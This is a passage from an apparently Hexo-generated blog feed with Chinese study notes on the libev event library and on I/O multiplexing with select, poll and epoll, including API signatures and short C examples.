        <content type="html"><![CDATA[<h1 id="libev学习笔记"><a href="#libev学习笔记" class="headerlink" title="libev学习笔记"></a>libev学习笔记</h1><h3 id="1-什么是libev"><a href="#1-什么是libev" class="headerlink" title="1.什么是libev?"></a>1.什么是libev?</h3><p>libev是一个强大的网络reactor,支持多种事件(信号,I&#x2F;O,定时器…..)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基本数据类型的宏定义</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EV_A  loop </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EV_A_ EV_A,</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EV_P  struct ev_loop *loop </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> EV_P_ EV_P,</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ev_io</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  EV_WATCHER_LIST (ev_io)</span><br><span class="line">  <span class="type">int</span> fd;     <span class="comment">/* ro */</span></span><br><span class="line">  <span class="type">int</span> events; <span class="comment">/* ro */</span></span><br><span class="line">&#125; ev_io;</span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ev_loop</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    ev_tstamp ev_rt_now;</span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> ev_rt_now ((loop)-&gt;ev_rt_now)</span></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> VAR(name,decl) decl;</span></span><br><span class="line">      <span class="meta">#<span class="keyword">include</span> <span class="string">&quot;ev_vars.h&quot;</span></span></span><br><span class="line">    <span class="meta">#<span class="keyword">undef</span> VAR</span></span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><h3 id="2-使用方法"><a href="#2-使用方法" class="headerlink" title="2.使用方法"></a>2.使用方法</h3><h4 id="1-创建ev-loop对象"><a href="#1-创建ev-loop对象" class="headerlink" title="1.创建ev_loop对象"></a>1.创建ev_loop对象</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> ev_loop *<span class="title function_">ev_loop_new</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> flag)</span>;</span><br><span class="line"><span class="comment">//创建一个ev_loop对象,这里的flag用于选择什么backend来实现多路复用</span></span><br><span class="line"><span class="comment">//flag的一些宏定义,一般用于选择后台多路复用机制,一般使用EVFLAG_AUTO(0)即可</span></span><br><span class="line"></span><br><span class="line">* EVBACKEND_SELECT</span><br><span class="line">* EVBACKEND_POLL</span><br><span class="line">* EVBACKEND_EPOLL                       </span><br><span class="line">* EVBACKEND_KQUEUE</span><br><span class="line">* EVBACKEND_DEVPOLL</span><br><span class="line">* EVBACKEND_PORT</span><br><span class="line"></span><br><span class="line">* EVFLAG_NOINOTIFY                     <span class="comment">// 不适用inofity调用来使用ev_stat.这样可以减少fd使用。</span></span><br><span class="line">* EVFLAG_SIGNALFD                      <span class="comment">// 使用signalfd来检测信号是否发生，同样这样可以减少fd</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ev_loop_destroy</span><span class="params">(EV_P)</span>;</span><br><span class="line"><span class="comment">//销毁一个ev_loop对象</span></span><br></pre></td></tr></table></figure><h4 id="2-绑定用户数据以及reactor的开始与退出"><a href="#2-绑定用户数据以及reactor的开始与退出" class="headerlink" title="2.绑定用户数据以及reactor的开始与退出"></a>2.绑定用户数据以及reactor的开始与退出</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="type">void</span> <span class="title function_">ev_set_userdata</span><span class="params">(EV_P_ <span class="type">void</span> *data)</span>;</span><br><span class="line">  <span class="type">void</span> *<span class="title function_">ev_userdata</span><span class="params">(EV_P)</span>;</span><br><span class="line">  <span class="comment">//ev_loop如何运行和停止   </span></span><br><span class="line">  <span class="type">void</span> <span class="title function_">ev_run</span><span class="params">(EV_P_ <span class="type">int</span> flags)</span>;</span><br><span class="line">  <span class="type">void</span> <span class="title function_">ev_break</span><span class="params">(EV_P_ <span class="type">int</span> how)</span>;</span><br><span class="line">  <span class="comment">//flags参数</span></span><br><span class="line">* <span class="number">0</span>             <span class="comment">//通常这是我们想要的，每次轮询在poll都会等待一段时间然后处理pending事件。</span></span><br><span class="line">* EVRUN_NOWAIT  <span class="comment">//运行一次，在poll时候不会等待。这样效果相当于只是处理pending事件。</span></span><br><span class="line">* EVRUN_ONCE    <span class="comment">//运行一次，但是在poll时候会等待，然后处理pending事件。</span></span><br><span class="line">而how有下面这几个：</span><br><span class="line"></span><br><span class="line">* EVBREAK_ONE   <span class="comment">//只是退出一次ev_run这个调用。通常来说使用这个就可以了。</span></span><br><span class="line">* EVBREAK_ALL   <span class="comment">//退出所有的ev_run调用。这种情况存在于ev_run在pengding处理时候会递归调</span></span><br><span class="line">ev_set_loop_release_cb (EV_P_ <span class="type">void</span> (*release)(EV_P) EV_NOEXCEPT, <span class="type">void</span> (*acquire)(EV_P) EV_NOEXCEPT)     <span class="comment">//设置回调函数,用于epoll_wait前后调用</span></span><br></pre></td></tr></table></figure><h4 id="3-设置轮询时间"><a href="#3-设置轮询时间" class="headerlink" title="3.设置轮询时间"></a>3.设置轮询时间</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在event_loop里面我们还关心一件事情，就是每次event_loop轮询的时间长短。通常来说这个不会是太大问题，但是在高性能情况下面我们需要设置</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ev_set_io_collect_interval</span><span class="params">(EV_P_ ev_tstamp interval)</span>;<span class="comment">//设置轮询时间</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">ev_set_timeout_collect_interval</span><span class="params">(EV_P_ ev_tstamp interval)</span>;<span class="comment">//设置超时时间</span></span><br></pre></td></tr></table></figure><h4 id="4-Watcher"><a href="#4-Watcher" class="headerlink" title="4.Watcher"></a>4.Watcher</h4><p>watcher 相当于eventhandler,一般ev_loop用于创建libev里面的reactor对象,而watcher就是事件触发后处理事件的模块,通常绑定fd,以及发生事件后处理事件的回调函数,下列的type用于区分不同的watcher<br>watcher的状态</p><ul><li><p>initialiased 已经初始化</p></li><li><p>active 调用start进行注册</p></li><li><p>pending 已经触发事件但是还没有处理</p></li><li><p>inactive 调用stop注销.这个状态和已经初始化是一样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*)</span><span class="params">(<span class="keyword">struct</span> ev_loop *loop, ev_TYPE *watcher, <span class="type">int</span> revents)</span> callback; <span class="comment">// callback都是这种类型</span></span><br><span class="line">ev_init (ev_TYPE *watcher, callback);                         <span class="comment">// 初始化watcher</span></span><br><span class="line">ev_TYPE_set (ev_TYPE *watcher, [args]);                       <span class="comment">// 设置watcher</span></span><br><span class="line">ev_TYPE_init (ev_TYPE *watcher, callback, [args]);            <span class="comment">// 通常使用这个函数最方便，初始化和设置都在这里</span></span><br><span class="line">ev_TYPE_start (loop, ev_TYPE *watcher);                       <span class="comment">// 注册watcher</span></span><br><span class="line">ev_TYPE_stop (loop, ev_TYPE *watcher);                        <span class="comment">// 注销watcher</span></span><br><span class="line">ev_set_priority (ev_TYPE *watcher, <span class="type">int</span> priority);             <span class="comment">// 设置优先级</span></span><br><span class="line">ev_feed_event (loop, ev_TYPE *watcher, <span class="type">int</span> revents);          <span class="comment">// 这个做跨线程通知非常有用，相当于触发了某个事件。</span></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ev_is_active</span> <span class="params">(ev_TYPE *watcher)</span>;                         <span class="comment">// watcher是否active.</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ev_is_pending</span> <span class="params">(ev_TYPE *watcher)</span>;                        <span class="comment">// watcher是否pending.</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ev_clear_pending</span> <span class="params">(loop, ev_TYPE *watcher)</span>;                <span class="comment">// 清除watcher pending状态并且返回事件</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="5-实例"><a href="#5-实例" class="headerlink" title="5.实例"></a>5.实例</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一个简单的io驱动事件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ev.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">stdin_cb</span><span class="params">(EV_P_ ev_io *w,<span class="type">int</span> revents)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">    ev_io_stop(EV_A_ w);</span><br><span class="line">    ev_break(EV_A_ EVBREAK_ALL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ev_loop</span> *<span class="title">loop</span>=</span> EV_DEFAULT;</span><br><span class="line">    ev_io stdin_watcher;</span><br><span class="line">    ev_io_init(&amp;stdin_watcher,stdin_cb,<span class="number">0</span>,EV_READ);<span class="comment">//初始化watcher,设置事件处理的回调函数</span></span><br><span class="line">    ev_io_start(loop,&amp;stdin_watcher);<span class="comment">//设置reactor的watcher</span></span><br><span class="line">    ev_run(loop,<span class="number">0</span>);<span class="comment">//开始监听事件的到来,一旦事件到来,指向对应的watcher中的回调函数</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-和epoll对比"><a href="#6-和epoll对比" class="headerlink" title="6.和epoll对比"></a>6.和epoll对比</h4><p>ev_loop相当于struct event_base *base,监听集合<br>watcher相当于struct event *event,但是相比于epoll中的event,watcher中设置了相应的回调函数。<br>ev_run相当于epoll_wait函数开始监听事件的到来,到事件到来的时候调用相应的回调函数处理相应的事件</p>]]></content>
      
      
      <categories>
          
          <category> 软件开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>I/O多路复用</title>
      <link href="/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/"/>
      <url>/2022/04/17/I-O%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="I-O多路复用"><a href="#I-O多路复用" class="headerlink" title="I&#x2F;O多路复用"></a>I&#x2F;O多路复用</h1><h3 id="1-什么是I-O多路复用"><a href="#1-什么是I-O多路复用" class="headerlink" title="1.什么是I&#x2F;O多路复用"></a>1.什么是I&#x2F;O多路复用</h3><p>I&#x2F;O 多路复用是一种同步IO模型，实现一个线程可以监视多个文件句柄；<br>一旦某个文件句柄就绪，就能够通知应用程序进行相应的读写操作；<br>没有文件句柄就绪就会阻塞应用程序，交出CPU。</p><h3 id="2-为什么会有I-O多路复用机制"><a href="#2-为什么会有I-O多路复用机制" class="headerlink" title="2.为什么会有I&#x2F;O多路复用机制"></a>2.为什么会有I&#x2F;O多路复用机制</h3><p>没有IO多路复用机制时，有BIO、NIO两种实现方式，但它们都有一些问题</p><h5 id="1-同步阻塞"><a href="#1-同步阻塞" class="headerlink" title="1.同步阻塞"></a>1.同步阻塞</h5><p>服务端采用单线程，当 accept 一个请求后，在 recv 或 send 调用阻塞时，将无法 accept 其他请求（必须等上一个请求处理 recv 或 send 完 ）（无法处理并发）</p><p>服务端采用多线程，当 accept 一个请求后，开启线程进行 recv，可以完成并发处理，但随着请求数增加需要增加系统线程，大量的线程占用很大的内存空间，并且线程切换会带来很大的开销，10000个线程真正发生读写实际的线程数不会超过20%，每次accept都开一个线程也是一种资源浪费。</p><h5 id="2-异步阻塞"><a href="#2-异步阻塞" class="headerlink" title="2.异步阻塞"></a>2.异步阻塞</h5><p>服务器端当 accept 一个请求后，加入 fds 集合，每次轮询一遍 fds 集合 recv (非阻塞)数据，没有数据则立即返回错误，每次轮询所有 fd （包括没有发生读写实际的 fd）会很浪费 CPU资源</p><h3 id="3-实现I-O多路复用的几种方式"><a href="#3-实现I-O多路复用的几种方式" class="headerlink" title="3.实现I&#x2F;O多路复用的几种方式"></a>3.实现I&#x2F;O多路复用的几种方式</h3><ul><li><p>1.select</p></li><li><p>2.poll</p></li><li><p>3.epoll</p></li></ul><h4 id="1-select实现I-O多路复用"><a href="#1-select实现I-O多路复用" class="headerlink" title="1.select实现I&#x2F;O多路复用"></a>1.select实现I&#x2F;O多路复用</h4><h5 id="1-1-涉及的api"><a href="#1-1-涉及的api" class="headerlink" title="1.1.涉及的api"></a>1.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">select</span><span class="params">(<span class="type">int</span> nfds,fd_set *readfds,fd_set *writefds,fd_set exceptfds,<span class="keyword">struct</span> timeval *timeout)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pselect</span><span class="params">(<span class="type">int</span> nfds,fd_set *readfds,fd_set *writefds,fd_set *exceptfds,<span class="keyword">struct</span> timeval *timeout,<span class="type">sigset_t</span> sigmask)</span>;</span><br><span class="line"><span class="comment">//功能:阻塞监听多个文件描述符的变化(可被信号打断)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//参数</span></span><br><span class="line"><span class="comment">//nfds为监听的最大文件描述符+1</span></span><br><span class="line"><span class="comment">//readfds,writefds,exceptfds分别为监听可读，可写,异常集合</span></span><br><span class="line"><span class="comment">//timeval为超时时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值</span></span><br><span class="line"><span class="comment">//正常返回变化的文件描述符总个数,超时返回0,错误返回-1</span></span><br><span class="line"></span><br><span class="line">FD_ZERO(fd_set *<span class="built_in">set</span>);</span><br><span class="line"><span class="comment">//将集合清零</span></span><br><span class="line"></span><br><span class="line">FD_SET(<span class="type">int</span> fd,fd_set *<span class="built_in">set</span>);</span><br><span class="line"><span class="comment">//将文件描述符添加到集合</span></span><br><span class="line"></span><br><span class="line">FD_CLR(<span class="type">int</span> fd,fd_set *<span class="built_in">set</span>);</span><br><span class="line"><span class="comment">//将监听的文件描述符从集合中移除</span></span><br></pre></td></tr></table></figure><h5 id="1-2-操作实例"><a href="#1-2-操作实例" class="headerlink" title="1.2.操作实例"></a>1.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> fd = New_Socket(argv[<span class="number">1</span>], argv[<span class="number">2</span>], <span class="number">10</span>);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Create Socket error!\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">fd_set fdset, rset;</span><br><span class="line"><span class="comment">//创建监听集合</span></span><br><span class="line">FD_ZERO(&amp;fdset);</span><br><span class="line"><span class="comment">//将需要监听的文件描述符加入到监听集合</span></span><br><span class="line">FD_SET(fd, &amp;fdset);</span><br><span class="line">    .....</span><br><span class="line"><span class="type">int</span> maxfd = fd + <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timeval</span> <span class="title">timeout</span> =</span> &#123; <span class="number">20</span>, <span class="number">20</span> &#125;;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">rset = fdset;</span><br><span class="line"><span class="type">int</span> nfds = select(maxfd, &amp;rset, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;timeout);</span><br><span class="line">        <span class="comment">//maxfd为监听的最大的文件描述符+1,maxfd为为轮询机制,每次都会轮询所有的fd看是否发生异常</span></span><br><span class="line"><span class="comment">// select函数返回值大于0代表有文件描述符有数据到来,返回值小于0代表发生了异常,返回值等于0代表超时</span></span><br><span class="line"><span class="keyword">if</span> (nfds &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;select&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (nfds == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;select timeout\n&quot;</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (FD_ISSET(fd, &amp;rset)) &#123;</span><br><span class="line">Handler(fd, &amp;fdset);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-使用poll实现I-O多路复用"><a href="#2-使用poll实现I-O多路复用" class="headerlink" title="2.使用poll实现I&#x2F;O多路复用"></a>2.使用poll实现I&#x2F;O多路复用</h4><h5 id="2-1-涉及的api"><a href="#2-1-涉及的api" class="headerlink" title="2.1.涉及的api"></a>2.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;poll.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> &#123;</span></span><br><span class="line">               <span class="type">int</span>   fd;         <span class="comment">/* file descriptor */</span></span><br><span class="line">               <span class="type">short</span> events;     <span class="comment">/* requested events */</span></span><br><span class="line">               <span class="type">short</span> revents;    <span class="comment">/* returned events */</span></span><br><span class="line">           &#125;;</span><br><span class="line"><span class="comment">//fd为监听的文件描述符</span></span><br><span class="line"><span class="comment">//events为监听的事件</span></span><br><span class="line"><span class="comment">//revents为发生的事件</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">poll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds,<span class="type">nfds_t</span> nfds,<span class="type">int</span> timeout)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ppoll</span><span class="params">(<span class="keyword">struct</span> pollfd *fds,<span class="type">nfds_t</span> nfds,cont <span class="keyword">struct</span> timespec *tmo_p,<span class="type">const</span> <span class="type">sigset_t</span> *sigmask)</span>;</span><br><span class="line"><span class="comment">//功能:同时监听多个文件描述符,底层原理和select一样,只是将原有的fd_set改为了struct pollfd结构体</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//参数 </span></span><br><span class="line"><span class="comment">//fds,监听的pollfd的数组指针,nfds,监听的文件描述符的个数,timeout为超时时间,sigmask为屏蔽的信号集合</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//返回值</span></span><br><span class="line"><span class="comment">//成功时返回一个正数(具有非零revents的结构体数量)</span></span><br><span class="line"><span class="comment">//错误时</span></span><br><span class="line"><span class="comment">// EFAULT 给出的参数不在可用的调用地址空间内.</span></span><br><span class="line"><span class="comment">// EINTR  被信号打断</span></span><br><span class="line"><span class="comment">// EINVAL nfds 值超过了 RLIMIT_NOFILE 值。</span></span><br><span class="line"><span class="comment">// EINVAL (ppoll()) The timeout value expressed in *ip is invalid (negative).</span></span><br><span class="line"><span class="comment">// ENOMEM 没有空间来分配文件描述符表</span></span><br></pre></td></tr></table></figure><h5 id="2-2-操作实例"><a href="#2-2-操作实例" class="headerlink" title="2.2.操作实例"></a>2.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> fd;<span class="comment">//需要监听的文件描述符</span></span><br><span class="line">    <span class="type">short</span> event;<span class="comment">//需要监听的事件</span></span><br><span class="line">    <span class="type">short</span> revent;<span class="comment">//已经发生的事件</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_FD 100</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">fd</span>[<span class="title">MAX_FD</span>];</span></span><br><span class="line">    <span class="comment">//设置监听事件和监听的文件描述符</span></span><br><span class="line">    fd[i].event = POLLIN</span><br><span class="line">    <span class="comment">//设置完成后</span></span><br><span class="line">    <span class="type">int</span> nfds = poll(<span class="keyword">struct</span> pollfd fds[], <span class="type">nfds_t</span> nfds, <span class="type">int</span> timeout);</span><br><span class="line"><span class="comment">//比较revent看revent是否发生了变化,若发生了变化则文件描述符则该文件描述符有数据到来</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;MAX_FD,i++)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(fd[i].revent &amp; POLLIN)</span><br><span class="line">        .....</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-使用epoll实现I-O多路复用"><a href="#3-使用epoll实现I-O多路复用" class="headerlink" title="3.使用epoll实现I&#x2F;O多路复用"></a>3.使用epoll实现I&#x2F;O多路复用</h4><h5 id="3-1-涉及的api"><a href="#3-1-涉及的api" class="headerlink" title="3.1.涉及的api"></a>3.1.涉及的api</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">epoll_create</span><span class="params">(<span class="type">int</span> size)</span>;</span><br><span class="line"><span class="comment">// 内核中间加一个 ep 对象，把所有需要监听的 socket 都放到 ep 对象中,返回一个ep对象,linux2.6.8开始忽略了size的意义</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_ctl</span><span class="params">(<span class="type">int</span> epfd, <span class="type">int</span> op, <span class="type">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span>;</span><br><span class="line"><span class="comment">//负责把 socket 增加、删除到内核红黑树</span></span><br><span class="line"><span class="comment">//参数:epfd为ep对象,op为操作类型,fd为监听的文件描述符</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_wait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event * events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">epoll_pwait</span><span class="params">(<span class="type">int</span> epfd, <span class="keyword">struct</span> epoll_event * events, <span class="type">int</span> maxevents, <span class="type">int</span> timeout,<span class="type">const</span> <span class="type">sigset_t</span> *sigmask)</span>;</span><br><span class="line"><span class="comment">//负责检测可读队列，没有可读 socket 则阻塞进程,epfd为ep对象,events,为发生存储已经发生事件的结构体数组，maxevents为最大可发生的事件的文件描述符的数量,timeout为超时时间</span></span><br></pre></td></tr></table></figure><h5 id="3-2-操作实例"><a href="#3-2-操作实例" class="headerlink" title="3.2.操作实例"></a>3.2.操作实例</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 